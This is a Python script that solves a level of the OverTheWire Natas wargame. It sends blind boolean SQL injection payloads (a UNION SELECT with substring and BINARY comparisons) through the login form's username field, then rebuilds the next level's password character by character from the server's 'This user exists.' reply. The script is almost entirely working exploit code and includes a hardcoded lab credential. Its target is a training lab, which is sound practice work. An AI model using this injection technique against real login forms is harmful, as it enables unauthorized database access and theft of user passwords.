import requests

url ="http://natas15.natas.labs.overthewire.org/"
username = 'natas15'
password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'

data = {}
senha = str()

letras = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

for d in range(1, 33):
    print(f"{d} of 32")
    for c in range(len(letras)):
        if d == 1:
            data['username'] = '" UNION ALL SELECT 1,2 FROM users WHERE username = "natas16" AND substring(password,{},1) = BINARY "{}";#"'.format(d,letras[c])        
        else:
            data['username'] = string + ' AND substring(password,{},1) = BINARY "{}";#"'.format(d,letras[c])
        
        response = requests.post(url=url,auth=(username, password),data=data)
        
        if "This user exists." in response.text:
            string = data['username'].split(';#')[0]
            print(letras[c])
            senha += letras[c] 
            break

print("Progress: 100%")
print(senha)
